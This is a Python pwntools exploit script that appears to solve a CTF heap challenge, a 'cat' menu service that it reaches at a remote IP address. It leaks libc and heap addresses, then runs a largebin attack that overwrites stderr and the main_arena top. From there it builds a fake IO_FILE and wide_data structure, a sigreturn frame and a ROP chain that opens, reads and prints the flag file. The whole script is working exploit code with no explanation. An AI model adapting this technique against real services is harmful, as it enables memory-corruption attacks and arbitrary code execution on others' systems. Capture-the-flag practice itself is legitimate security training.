#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

# context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "39.107.237.149 39236"
remote_service = remote_service.strip().split(" ")
p = remote(remote_service[0], int(remote_service[1]))
filename = "./test"
# p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def ROL(content, key):
    tmp = bin(content)[2:].rjust(64, '0')
    return int(tmp[key:] + tmp[:key], 2)
def debugPID():
	# lg("p.pid")
	# input()
	pass
def cmd(payload):
	ru(b'mew mew mew~~~~~~\n')
	sn(payload)
def login():
	debugPID()
	content = b'admin'
	cmd(b'LOGIN | r00tQWBQWXF\x00' + content)
def menu(choice):
	content = p32(0xffffffff) + b'$\x00'
	cmd(b'CAT | r00tQWBQWXF\x00' + content)
	ru(b'plz input your cat choice:\n')
	sl(i2b(choice))

def add(idx, size, content):
	menu(1)
	ru(b'plz input your cat idx:\n')
	sl(i2b(idx))
	ru(b'plz input your cat size:\n')
	sl(i2b(size))
	ru(b'plz input your content:\n')
	sn(content)
def delete(idx):
	menu(2)
	ru(b'plz input your cat idx:\n')
	sl(i2b(idx))
def show(idx):
	menu(3)
	ru(b'plz input your cat idx:\n')
	sl(i2b(idx))
	ru(b"Context:\n")
def edit(idx, content):
	menu(4)
	ru(b"plz input your cat idx:\n")
	sl(i2b(idx))
	ru(b"plz input your content:\n")
	sn(content)

login()
add(0, 0x428, b'a'*0x428)
add(1, 0x428, b'a')
add(2, 0x418, b'b'*0x418)
delete(0)
show(0)

libc_base = uu64(rn(8)) - 0x1f2ce0 - 0x27000
lg("libc_base")
main_arena_top = libc_base + 0x1f2ce0 + 0x27000
stderr_addr = libc_base + l.symbols['stderr']
setcontext_addr = libc_base + l.symbols['setcontext']

pop_rax_addr = libc_base + 0x0000000000045eb0
pop_rdi_addr = libc_base + 0x000000000002a3e5
pop_rsi_addr = libc_base + 0x00000000000da97d
pop_rddx_addr = libc_base + 0x000000000011f497
syscall_addr = libc_base + 0x0000000000091396
pop_rsp_ret = 0x0000000000035732 + libc_base
mov_rsp_rdx_ret = 0x000000000005a170 + libc_base
ret_addr = 0x00000000000f872e + libc_base

add(3, 0x448, b'xxx')
delete(2)
show(0)
leak1 = uu64(rn(8))
leak2 = uu64(rn(8))
leak3 = uu64(rn(8))
leak4 = uu64(rn(8))
heap_base = leak3 - 0x290
lg("heap_base")

srop_addr = heap_base + 0x1c10
next_chain = 0
fake_IO_FILE = 2 * p64(0)
fake_IO_FILE += p64(0)  # _IO_write_base = 0
fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(0)  # _IO_buf_base
fake_IO_FILE += p64(0)  # _IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
fake_IO_FILE += p64(next_chain)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(heap_base)  # _lock = writable address
fake_IO_FILE += p64(0)*2
fake_IO_FILE += p64(heap_base + 0x17b0 + 0x10)  # _wide_data = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b'\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b'\x00')
fake_IO_FILE += p64(libc_base + l.symbols['_IO_wfile_jumps'])  # vtable

fake_wide_data = p64(pop_rsp_ret) + p64(heap_base + 0x1c10) + p64(ret_addr)
fake_wide_data += p64(0)  # _IO_write_base = 0
fake_wide_data += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
fake_wide_data += p64(0)
fake_wide_data += p64(0)  # _IO_buf_base
fake_wide_data += p64(0)  # _IO_buf_end
fake_wide_data = fake_wide_data.ljust(0xe0, b'\x00')
fake_wide_data += p64(heap_base + 0x1360 + 0x10)  # _wide_vtable = writable address

fake_frame_addr = srop_addr
frame = SigreturnFrame()
frame.rdi = fake_frame_addr + 0xF8
frame.rsi = 0
frame.rdx = 0x100
frame.rsp = fake_frame_addr + 0xF8 + 0x10
frame.rip = pop_rdi_addr + 1

rop_data = [
	pop_rax_addr,
	3,
	pop_rdi_addr,
	0,
	syscall_addr,

	pop_rdi_addr,
	fake_frame_addr + 0x200,
	pop_rsi_addr,
	0,
	pop_rddx_addr,
	0,
	0,
	pop_rax_addr,  # sys_open('flag', 0)
	2,
	syscall_addr,

	pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
	0,
	pop_rdi_addr,
	0,
	pop_rsi_addr,
	fake_frame_addr + 0x200,
	pop_rddx_addr,
	0x100,
	0x100,
	syscall_addr,

	pop_rax_addr,  # sys_write(1, heap, 0x100)
	1,
	pop_rdi_addr,
	1,
	pop_rsi_addr,
	fake_frame_addr + 0x200,
	syscall_addr
]

add(4, 0x418, fake_IO_FILE)
add(5, 0x428, b'a'*0x428)

delete(5)
add(6, 0x448, p64(0)*13 + p64(mov_rsp_rdx_ret))
delete(4)
edit(0, p64(leak1) + p64(leak2) + p64(0) + p64(stderr_addr-0x20))
add(7, 0x448, fake_wide_data)   # stack
add(13, 0x46f, flat(rop_data).ljust(0x200, b'\x00') + b'./flag\x00\x00')

add(8, 0x468, b'xxx')
add(9, 0x468, b'xxx')
add(10, 0x458, b'xxx')
delete(8)
add(11, 0x46f, b'xxx')
delete(10)
show(8)
leak1 = uu64(rn(8))
leak2 = uu64(rn(8))
leak3 = uu64(rn(8))
leak4 = uu64(rn(8))
edit(8, p64(leak1) + p64(leak2) + p64(leak3) + p64(main_arena_top-0x20))
add(12, 0x46f, b'a')

debugPID()
irt()